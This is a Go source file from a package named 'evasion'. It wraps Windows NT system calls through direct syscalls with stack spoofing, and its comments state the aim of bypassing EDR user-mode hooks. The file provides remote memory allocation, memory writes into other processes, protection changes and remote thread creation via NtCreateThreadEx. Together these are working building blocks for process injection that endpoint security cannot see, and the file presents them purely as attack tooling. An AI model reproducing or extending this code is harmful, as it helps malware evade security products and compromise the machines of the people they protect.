//go:build windows
// +build windows

package evasion

import (
	"sync"
	"unsafe"
)

// NT system-call helpers — all routed through HGProc (direct syscall + stack
// spoof) so that EDR user-mode hooks on ntdll stubs never intercept them.
// This also breaks the circular dependency that existed when unhookNtdll()
// called ntProtect through a potentially-hooked LazyProc before cleaning ntdll.

const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1

var (
	hgNtProtectOnce sync.Once
	hgNtProtectProc *HGProc

	hgNtWriteOnce sync.Once
	hgNtWriteProc *HGProc

	hgNtFlushOnce sync.Once
	hgNtFlushProc *HGProc

	hgNtSetInfoOnce sync.Once
	hgNtSetInfoProc *HGProc

	hgNtAllocOnce sync.Once
	hgNtAllocProc *HGProc

	hgNtCreateThreadOnce sync.Once
	hgNtCreateThreadProc *HGProc
)

func getNtProtectProc() *HGProc {
	hgNtProtectOnce.Do(func() {
		hgNtProtectProc = NewHGProc("NtProtectVirtualMemory")
	})
	return hgNtProtectProc
}

func getNtWriteProc() *HGProc {
	hgNtWriteOnce.Do(func() {
		hgNtWriteProc = NewHGProc("NtWriteVirtualMemory")
	})
	return hgNtWriteProc
}

func getNtFlushProc() *HGProc {
	hgNtFlushOnce.Do(func() {
		hgNtFlushProc = NewHGProc("NtFlushInstructionCache")
	})
	return hgNtFlushProc
}

func getNtSetInfoProc() *HGProc {
	hgNtSetInfoOnce.Do(func() {
		hgNtSetInfoProc = NewHGProc("NtSetInformationProcess")
	})
	return hgNtSetInfoProc
}

func getNtAllocProc() *HGProc {
	hgNtAllocOnce.Do(func() {
		hgNtAllocProc = NewHGProc("NtAllocateVirtualMemory")
	})
	return hgNtAllocProc
}

func getNtCreateThreadProc() *HGProc {
	hgNtCreateThreadOnce.Do(func() {
		hgNtCreateThreadProc = NewHGProc("NtCreateThreadEx")
	})
	return hgNtCreateThreadProc
}

// NtAllocateVirtualMemory allocates virtual memory in a process without going
// through kernel32!VirtualAllocEx (bypasses EDR hooks on the Win32 layer).
//   processHandle: target process (windows.CurrentProcess() for self)
//   size:          bytes to allocate (rounded up to page boundary by kernel)
//   protect:       page protection (e.g. windows.PAGE_EXECUTE_READ)
//
// Returns the allocated base address or 0 on failure.
func NtAllocateVirtualMemory(processHandle uintptr, size uintptr, protect uint32) uintptr {
	p := getNtAllocProc()
	if p == nil {
		return 0
	}
	var base uintptr
	const memCommitReserve = 0x3000
	r, _, _ := p.Call(
		processHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&size)),
		memCommitReserve,
		uintptr(protect),
	)
	if r != 0 {
		return 0
	}
	return base
}

// NtCreateThreadEx starts a thread in the target process at startAddress via
// a direct NtCreateThreadEx syscall stub (bypasses EDR hooks on ntdll dispatch).
// Returns the thread handle or 0 on failure.
func NtCreateThreadEx(processHandle uintptr, startAddress uintptr) uintptr {
	p := getNtCreateThreadProc()
	if p == nil {
		return 0
	}
	const accessAll = 0x1FFFFF
	var threadHandle uintptr
	r, _, _ := p.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		accessAll,
		0,
		processHandle,
		startAddress,
		0, 0, 0, 0, 0, 0,
	)
	if r != 0 {
		return 0
	}
	return threadHandle
}

// ntProtect changes memory protection via a direct NtProtectVirtualMemory
// syscall stub — bypasses any EDR hook on the ntdll dispatch path.
func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32, ok bool) {
	p := getNtProtectProc()
	if p == nil {
		return 0, false
	}
	baseAddr := addr
	regionSize := size
	r, _, _ := p.Call(
		ntCurrentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return oldProtect, r == 0
}

// ntWrite writes bytes directly via a direct NtWriteVirtualMemory syscall.
func ntWrite(dst uintptr, src []byte) bool {
	return NtWriteRemote(ntCurrentProcess, dst, src)
}

// NtWriteRemote writes src bytes into processHandle:dst via NtWriteVirtualMemory,
// bypassing any EDR hook on WriteProcessMemory.
func NtWriteRemote(processHandle uintptr, dst uintptr, src []byte) bool {
	p := getNtWriteProc()
	if p == nil || len(src) == 0 {
		return false
	}
	var written uintptr
	r, _, _ := p.Call(
		processHandle,
		dst,
		uintptr(unsafe.Pointer(&src[0])),
		uintptr(len(src)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r == 0
}

// ntFlush flushes the CPU instruction cache after patching executable memory.
func ntFlush(addr uintptr, size uintptr) {
	p := getNtFlushProc()
	if p == nil {
		return
	}
	p.Call(ntCurrentProcess, addr, size)
}
